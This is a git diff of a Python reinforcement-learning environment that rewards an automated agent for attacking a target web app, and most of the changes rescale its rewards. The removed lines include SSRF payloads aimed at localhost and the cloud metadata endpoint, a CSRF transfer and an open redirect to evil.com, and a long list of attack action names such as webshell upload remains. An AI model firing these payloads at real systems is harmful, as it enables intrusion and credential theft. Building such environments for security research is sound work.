     # ORIGINAL ACTION IMPLEMENTATIONS - Fallback for compatibility
@@ -1341,17 +1402,19 @@ class WebSecurityGym(gym.Env):
         """Navigate to registration page."""
         try:
             response = self.session.get(f"{self.target_url}/register", timeout=self.timeout)
-            self._update_state_from_response(response, "register_navigation")
+            reward = self._update_state_from_response(response, "register_navigation")
+            return response, reward
         except:
-            self._update_state_error()
+            return self._update_state_error()
 
     def navigate_admin(self):
         """Navigate to admin page."""
         try:
             response = self.session.get(f"{self.target_url}/admin", timeout=self.timeout)
-            self._update_state_from_response(response, "admin_navigation")
+            reward = self._update_state_from_response(response, "admin_navigation")
+            return response, reward
         except:
-            self._update_state_error()
+            return self._update_state_error()
 
     def navigate_home(self) -> Tuple[requests.Response, float]:
         """Go to Home Page"""
@@ -1709,27 +1772,13 @@ class WebSecurityGym(gym.Env):
 
     
     # SSRF & CSRF
-    def attack_ssrf_internal(self) -> Tuple[requests.Response, float]:
-        """SSRF to access internal network."""
-        r = self.session.post(f"{self.target_url}/fetch_url", json={"url": "http://localhost:22"}, timeout=3)
-        return r, self._calculate_reward(r, "SSRF_INTERNAL")
+
     
-    def attack_ssrf_cloud_metadata(self) -> Tuple[requests.Response, float]:
-        """SSRF to access cloud metadata."""
-        r = self.session.post(f"{self.target_url}/fetch_url", 
-                             json={"url": "http://169.254.169.254/latest/meta-data/"}, timeout=3)
-        return r, self._calculate_reward(r, "SSRF_CLOUD")
+
     
-    def attack_csrf_transfer(self) -> Tuple[requests.Response, float]:
-        """CSRF attack on money transfer."""
-        r = self.session.post(f"{self.target_url}/transfer_money", 
-                             json={"to_user": "attacker", "amount": "1000"}, timeout=3)
-        return r, self._calculate_reward(r, "CSRF")
+
     
-    def attack_open_redirect(self) -> Tuple[requests.Response, float]:
-        """Open Redirect vulnerability."""
-        r = self.session.get(f"{self.target_url}/redirect?url=http://evil.com", timeout=3)
-        return r, self._calculate_reward(r, "OPEN_REDIRECT")
+
     
     # Authentication & Authorization
     def attack_jwt_none_algorithm(self) -> Tuple[requests.Response, float]:
@@ -1877,12 +1926,12 @@ class WebSecurityGym(gym.Env):
         # Check for API documentation or endpoints
         if r.status_code == 200:
             if "swagger" in r.text.lower() or "openapi" in r.text.lower():
-                return r, 60.0  # Found API documentation!
+                return r, 0.2  # Found API documentation!
             if "graphql" in r.text.lower() or "graphiql" in r.text.lower():
-                return r, 55.0  # Found GraphQL
+                return r, 0.15  # Found GraphQL
             if '"version"' in r.text or '"status"' in r.text:
-                return r, 30.0  # Found API endpoint
-            return r, 10.0  # Found something
+                return r, 0.1  # Found API endpoint
+            return r, 0.05  # Found something
         return r, 0.0
 
     def action_wait(self) -> Tuple[None, float]:
@@ -1894,6 +1943,27 @@ class WebSecurityGym(gym.Env):
         """
         The Judge. Decides how many points the agent gets.
         """
+        # Ground Truth Check (Priority 2.2)
+        if 'X-Vuln-Confirmed' in response.headers:
+            return 1.0 # VULNERABILITY_REWARD (Simplified for now, or fetch from config if needed)
+
+        # Fix: Fallback constants when config is unavailable
+        if self.config is None:
+            WAF_PENALTY = -0.1
+            RATE_LIMIT_PENALTY = -0.1
+            VULNERABILITY_REWARD = 1.0
+            CTF_FLAG_REWARD = 2.0
+        else:
+            WAF_PENALTY = self.config.training.waf_penalty
+            RATE_LIMIT_PENALTY = self.config.training.rate_limit_penalty
+            VULNERABILITY_REWARD = self.config.training.vulnerability_reward
+            CTF_FLAG_REWARD = self.config.training.ctf_flag_reward
+        
+        # Ground Truth Check - using configured reward
+        if 'X-Vuln-Confirmed' in response.headers:
+             return VULNERABILITY_REWARD
+
+        
         reward = 0.0
         
         # COMPLEX CHAINING: Combo Multiplier
@@ -1903,35 +1973,35 @@ class WebSecurityGym(gym.Env):
         if self.auth_token:
             multiplier += 0.5 # +50% for being logged in (Authenticated Attack)
             
-        if hasattr(self, 'business_context') and self.business_context == 1:
-            multiplier += 1.0 # +100% for attacking business logic pages (Money/Admin)
+        if hasattr(self, 'business_context') and self.business_context > 0:
+            multiplier += 0.3 # +30% for attacking business logic pages
             
-        # DENSE REWARDS: Small rewards for "getting closer"
-        # 1. Found a form?
-        if "<form" in response.text.lower():
-            reward += 1.0
+        # Dense Rewards: Small rewards for progress
+        # 1. Found a Form (Potential Attack Surface)
+        if response.status_code == 200 and "form" in response.text.lower():
+            reward += 0.02
             
-        # 2. Found a URL parameter?
-        if "?" in response.url and "=" in response.url:
-            reward += 2.0
+        # 2. Found Parameters (Query String or JSON)
+        if "?" in response.url or (hasattr(response, 'request') and response.request.body):
+            reward += 0.02
             
-        # 3. Got a 500 Error (Potential Breakage)
+        # 3. Got a 500 Error (Potential Vulnerability but also possibly just crashing)
         if response.status_code == 500:
-            reward += 2.0
+            reward -= 0.1 # Penalty for crashing without confirmation
             
         # 4. Got a 403 Forbidden (Potential Sensitive Area)
         if response.status_code == 403:
-            reward += 2.0
+            reward += 0.05
             
         # 1. Penalty: Triggered the Firewall (WAF)
         if response.status_code == 403 and "WAF" in response.text:
             self.triggered_waf = 1
-            return -10.0
+            return WAF_PENALTY
         
         # 2. Penalty: Got Rate Limited (Too fast)
         if response.status_code == 429:
             self.got_rate_limited = 1
-            return -20.0
+            return RATE_LIMIT_PENALTY
         
         # 3. Success: Found a Vulnerability!
         # We look for specific "Flags" or indicators in the response
@@ -1980,17 +2050,17 @@ class WebSecurityGym(gym.Env):
                     self.found_vulnerability = 1
                     self.discovered_vulns.add(vuln_id)
                     
-                    base_reward = 150.0 # CRITICAL UPDATE: Increased from 100 to 150 to prioritize exploits
+                    base_reward = VULNERABILITY_REWARD # NORMALIZED: Confirmed Exploit (+1.0)
                     
                     # Bonus: Found a CTF Flag
                     if "CTF{" in response.text:
                         self.found_sensitive_data = 1
-                        base_reward += 50.0
+                        base_reward += CTF_FLAG_REWARD
                     
                     reward = base_reward * multiplier
                 else:
-                    # We already found this. Small reward to say "Good job, but move on."
-                    reward = 1.0 
+                    # We already found this. Tiny reward to say "Good job, but move on."
+                    reward = 0.001 
                 
                 break
         
@@ -2000,7 +2070,7 @@ class WebSecurityGym(gym.Env):
         """PENTESTER MODE: Track Code Coverage"""
         if page_id not in self.visited_pages:
             self.visited_pages.add(page_id)
-            return 5.0 # Reward for exploring a new page
+            return 0.05 # Reward for exploring a new page
         return 0.0
     
     # ============================================================================
@@ -2374,7 +2444,6 @@ class WebSecurityGym(gym.Env):
             'attack_csrf_post_creation', 'attack_csrf_profile_update', 'attack_csrf_token_prediction',
             'attack_ct_policy_bypass', 'attack_dns_rebinding',
             'attack_feature_policy_bypass', 'attack_file_upload_malware', 'attack_file_upload_webshell',
-            'attack_feature_policy_bypass', 'attack_file_upload_malware', 'attack_file_upload_webshell',
             'attack_frame_busting_bypass', 'attack_hpkp_bypass', 'attack_hsts_bypass',
             'attack_idor_account_balance', 'attack_idor_cart_manipulate', 'attack_idor_file_delete',
             'attack_idor_file_list', 'attack_idor_file_metadata', 'attack_idor_file_upload',
@@ -2387,7 +2456,6 @@ class WebSecurityGym(gym.Env):
             'attack_path_traversal_encoded', 'attack_path_traversal_null', 'attack_race_condition_balance',
             'attack_race_condition_cart', 'attack_race_condition_coupon', 'attack_role_escalation',
             'attack_sqli_blind_boolean', 'attack_sqli_union_select',
-            'attack_ssti_template', 'attack_subresource_integrity_bypass', 'attack_token_replay',
             'attack_ssti_template', 'attack_subresource_integrity_bypass', 'attack_token_replay',
             'attack_token_reuse', 'attack_waf_base64_encoding', 'attack_waf_case_variation',
             'attack_waf_comment_injection', 'attack_waf_cookie_manipulation', 'attack_waf_fragmentation',
@@ -2493,22 +2561,43 @@ class WebSecurityGym(gym.Env):
 
     def _update_state_error(self):
         """Update state when an error occurs during an action."""
-        # Simple penalty logic or just observation update
+        """Update state when an error occurs."""
         self.last_response_time = 0.0
         self.content_variance = 0.0
+        self.input_count = 0
+        return None, 0.01
+
+    def _analyze_response_content(self, response):
+        """Analyze response content for variance and other metrics."""
+        content_length = len(response.text)
         
+        # Track baseline per page
+        if self.current_page_id not in self.baseline_page_sizes:
+             self.baseline_page_sizes[self.current_page_id] = content_length
+        
+        baseline = self.baseline_page_sizes[self.current_page_id]
+        
+        if baseline > 0:
+            self.content_variance = abs(content_length - baseline) / baseline
+            
+        # Update baseline (rolling average) to adapt to small changes
+        self.baseline_page_sizes[self.current_page_id] = int((baseline * 0.9) + (content_length * 0.1))
+
     def _update_state_from_response(self, response, context=None):
         """Update state metrics from a response."""
+        # Fix: Analyze content first
+        self._analyze_response_content(response)
+        
+        # Fix: Properly calculate reward using _calculate_reward
         reward = 0.0
-        if hasattr(self, '_analyze_response_content'):
-            reward = self._analyze_response_content(response)
-            
+        if hasattr(self, '_calculate_reward'):
+            # Determine vuln_type from context if available
+            vuln_type = context if context else "unknown"
+            reward = self._calculate_reward(response, vuln_type)
+        
         # Store reward for actions that forget to return it
         self.current_step_reward = reward
-        
-        # Update variance and timing
-        self.last_response_time = response.elapsed.total_seconds()
-        self.input_count += 1
+        return reward
 
     def close(self) -> None:
         """Clean up resources."""
